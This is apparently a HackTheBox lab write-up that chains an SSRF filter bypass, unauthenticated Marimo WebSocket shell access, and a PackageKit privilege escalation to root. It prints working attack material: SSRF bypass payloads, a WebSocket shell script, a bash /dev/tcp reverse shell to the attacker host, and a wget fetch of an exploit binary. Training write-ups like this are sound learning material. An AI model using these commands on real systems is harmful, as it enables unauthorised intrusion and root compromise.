# Cohort – HackTheBox Writeup

**Target:** Cohort (10.129.X.X)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu, Kernel 6.8.0-136-generic)
**Difficulty:** Easy
**Attack Path:** Obfuscated JavaScript → SSRF (URL Validation) → Internal Service Discovery → Marimo WebSocket RCE (CVE-2026-39987) → PackageKit TOCTOU LPE (CVE-2026-41651)

---

## Recon

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.X.X
```

Three ports open. SSH on 22, HTTP on 80 redirecting to `https://cohort.htb/`, and HTTPS on 443 serving the actual site through nginx 1.24.0. The SSL certificate had `DNS:cohort.htb, DNS:*.cohort.htb` which means wildcard subdomains exist. Added it to hosts:

```bash
echo "10.129.X.X  cohort.htb" | sudo tee -a /etc/hosts
```

### The Website

The landing page is a marketing site for "Cohort Analytics" — retention intelligence for subscription teams. Nothing useful on the surface. It's a JavaScript SPA that loads everything from `/assets/app.js`. The entire app is obfuscated with AES encryption, Base64, `atob`, and `eval`. Couldn't deobfuscate it through the command line because it needed a browser environment with the Web Crypto API.

### Directory and Subdomain Enumeration

Ran ffuf against the site. The server returns 200 with a 908-byte body for every URL, so you have to filter by response size:

```bash
ffuf -u https://cohort.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -fs 908 -fc 301,405
```

Found three things: `assets` (static files), `status` (403 Forbidden), and `api`. The API had `/api/health` returning `{"ok": true, "service": "cohort-insights"}` and `/api/experiments` plus `/api/experiments/configurations` both returning 405 Method Not Allowed on GET.

Subdomain enumeration with ffuf found nothing — the wildcard nginx config catches everything and redirects to the main site.

### Finding the Portal

The landing page has a button labeled "Open Client Insights" that links straight to `/portal.html`. The JavaScript is heavily obfuscated with AES encryption and `eval` which made it impossible to analyze from the command line, but once the browser renders the page everything is right there. The portal page has a URL input field for validating report source URLs. The moment you see a URL input field on a web app, you think SSRF. If the server is fetching a URL you provide, you can make it fetch internal resources instead.

---

## SSRF

### Finding the Vulnerable Endpoint

The portal has a URL input field. Intercepting the request in the Network tab showed it hits `/api/experiments/validate` with a POST containing `{"url":"..."}`. Tested it from the command line:

```bash
curl -k -s -X POST "https://cohort.htb/api/experiments/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:80"}'
```

Got back `"Internal or loopback addresses are not permitted."`. There's a filter blocking localhost. But it's easy to bypass. `127.0.0.1` is blocked but `0.0.0.0` is not:

```bash
curl -k -s -X POST "https://cohort.htb/api/experiments/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0:80"}'
```

That returned the full page content. Other bypasses that worked: decimal IP (`2130706433`), hex (`0x7f000001`), octal (`0177.0.0.1`). IPv6 `[::1]` was also blocked. `0.0.0.0` is the simplest.

### Internal Port Discovery

Used the SSRF to scan internal ports. The error messages tell you what's going on: `ECONNREFUSED` means nothing is listening, a valid response means a service is there:

```bash
for port in 80 443 3000 5000 8000 8080 8888 9000; do
  resp=$(curl -k -s -X POST "https://cohort.htb/api/experiments/validate" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://0.0.0.0:$port\"}")
  echo "Port $port: $resp" | head -1
done
```

Found two internal services. Port 5000 is the backend API (`cohort-insights`). Port 8888 is **Marimo**, a notebook application with a login page asking for an "Access Token / Password".

### Identifying Marimo Version

```bash
curl -k -s -X POST "https://cohort.htb/api/experiments/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0:8888/api/version"}'
```

Version: **0.20.4**. Anything below 0.23.0 is vulnerable to CVE-2026-39987.

### Finding the Internal Hostname

The backend API's status endpoint leaked the entire infrastructure layout:

```bash
curl -k -s -X POST "https://cohort.htb/api/experiments/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0:80/status"}'
```

That returned a 403 from outside but the `/api/health` on port 5000 was more generous. Through SSRF we hit the nginx status page which exposed the upstream configuration:

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort"},
    {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
    {"name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888", "note": "internal analyst workspace, not for external use"}
  ]
}
```

The internal notebook hostname is `nb-1be3782a8afd3ad5.cohort.htb`. That random hex string is why no wordlist would ever find it. Added it to hosts:

```bash
echo "10.129.X.X  nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

---

## Getting a Shell

### CVE-2026-39987 — Marimo Pre-Auth RCE

Marimo versions before 0.23.0 expose a `/terminal/ws` WebSocket endpoint that provides an unauthenticated terminal session. No login required at all. The WebSocket just drops you into a shell.

Tested the connection:

```python
python3 -c "
import websocket, ssl
ws = websocket.create_connection('wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws', sslopt={'cert_reqs': ssl.CERT_NONE})
print(ws.recv())
"
# marimo@cohort:~$
```

That's a shell. The WebSocket expects raw terminal input, not JSON. Found a GitHub PoC at `fevar54/marimo_CVE-2026-39987_RCE_PoC` but it sends JSON-formatted commands which the terminal doesn't understand. Had to use raw text instead.

### Interactive Shell

Created a Python script that maintains the WebSocket connection and acts as an interactive terminal:

```bash
cat > /tmp/shell.py << 'EOF'
import websocket, ssl, threading, sys

ws = websocket.create_connection(
    'wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws',
    sslopt={'cert_reqs': ssl.CERT_NONE},
    timeout=None
)

def recv_loop():
    try:
        while True:
            data = ws.recv()
            if data:
                print(data, end='', flush=True)
    except:
        sys.exit(0)

t = threading.Thread(target=recv_loop, daemon=True)
t.start()

try:
    while True:
        cmd = input()
        ws.send(cmd + '\n')
except (KeyboardInterrupt, EOFError):
    ws.close()
EOF

python3 /tmp/shell.py
```

Important detail: can't use a heredoc (`python3 << 'EOF'`) for this because the heredoc eats stdin, so `input()` has nothing to read from and the script exits immediately. Has to be saved as a file first.

### Reverse Shell

The WebSocket shell doesn't support copy/paste well so I upgraded to a reverse shell.

Listener on Kali:

```bash
nc -lvnp 4444
```

In the WebSocket shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1'
```

Shell popped. Stabilized it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

User flag:

```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Enumeration

```bash
id
# uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)

uname -a
# Linux cohort 6.8.0-136-generic

sudo -l
# password required, don't have it

dpkg -l | grep packagekit
# packagekit 1.2.8-2ubuntu1.2

pkcon --version
# 1.2.8
```

PackageKit 1.2.8. Versions 1.0.2 through 1.3.4 are vulnerable to CVE-2026-41651, a TOCTOU race condition that lets any unprivileged user install packages as root without authentication.

### CVE-2026-41651 — PackageKit TOCTOU LPE

Grabbed the PoC from GitHub:

```bash
# On Kali
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
python3 -m http.server 8080
```

The exploit is a precompiled C binary that chains three bugs in `pk-transaction.c`. It creates a D-Bus transaction, sends `InstallFiles` with the `SIMULATE` flag (which skips polkit authentication), then immediately sends a second `InstallFiles` with the real payload. The first call sets the state to READY, the second overwrites the cached paths but can't change the state back because backward transitions are silently dropped. When the idle callback fires, it reads the overwritten paths and installs the payload as root. The payload's postinst script does `chmod +s /bin/bash`, creating a SUID bash binary.

On the target:

```bash
cd /tmp
wget http://10.10.XX.XX:8080/cve-2026-41651
chmod +x cve-2026-41651
./cve-2026-41651
```

```
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-75076.deb
[+] payload : /tmp/.pk-payload-75076.deb
[*] Transaction : /2_ecdbceee
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Polling for payload (120 s max)...
[+] SUCCESS — SUID bash at t+3900ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

The `euid=0(root)` is what matters. The effective UID is root so all kernel privilege checks pass.

### Root Flag

```bash
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap -p- → SSH (22), HTTP (80), HTTPS (443)
→ SSL cert → *.cohort.htb wildcard
→ Obfuscated JS → deobfuscated in browser → /portal.html discovered
→ /api/experiments/validate → SSRF with loopback filter
→ 0.0.0.0 bypass → internal port scan
→ Port 5000 (backend API), Port 8888 (Marimo 0.20.4)
→ SSRF on /status → leaked internal hostname nb-1be3782a8afd3ad5.cohort.htb
→ /etc/hosts → nginx proxies WebSocket to Marimo
→ CVE-2026-39987 → /terminal/ws unauthenticated shell
→ Reverse shell as marimo → user flag
→ PackageKit 1.2.8 → CVE-2026-41651 TOCTOU LPE
→ SUID bash → euid=0 → root flag
```

---

## What I Learned

Don't overthink obfuscated JavaScript. I wasted a ton of time trying to deobfuscate `app.js` with command line tools, grep, sed, node. The code used the Web Crypto API for AES decryption which only works in a browser. The portal link was literally a button on the rendered page. Always open the site in a browser first before diving into static analysis. If the JS is obfuscated, let the browser do its job and just interact with the rendered page.

SSRF loopback filters are rarely complete. The app blocked `127.0.0.1` and `[::1]` but `0.0.0.0`, decimal, hex, and octal representations all went through. Always try every encoding when you hit an SSRF filter. There's a good list on HackTricks.

Internal hostnames can be random and unfuzzable. `nb-1be3782a8afd3ad5.cohort.htb` would never appear in any wordlist. The only way to find it was through information disclosure from an internal API. When directory and subdomain brute forcing comes up empty, look for config endpoints, status pages, or health checks that leak infrastructure details.

WebSocket terminals expect raw text, not JSON. The PoC from GitHub sent `{"type": "exec", "command": "..."}` as the payload but the Marimo terminal WebSocket is a raw PTY connection. It wants plain commands followed by a newline. Always test the actual protocol before trusting a PoC.

Heredocs eat stdin in Python scripts. If you use `python3 << 'EOF'` with a script that calls `input()`, the heredoc consumes stdin and the script exits immediately. Save the script to a file and run it with `python3 /tmp/script.py` instead.

PackageKit is a dangerous attack surface. It runs as root, listens on D-Bus, and versions before 1.3.5 have a TOCTOU race that lets any local user install arbitrary packages without authentication. The exploit is deterministic — no actual race to win because both D-Bus messages are sent before the GLib idle loop iterates. Always check `pkcon --version` during privilege escalation enumeration.

The `euid=0` from SUID bash is functionally root. When the exploit creates a SUID bash at `/tmp/.suid_bash`, running it with `-p` (preserve privileges) gives you `euid=0`. You don't need `sudo` at that point. The kernel checks effective UID for all privilege decisions, so you can read `/root/root.txt` and do anything root can do.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
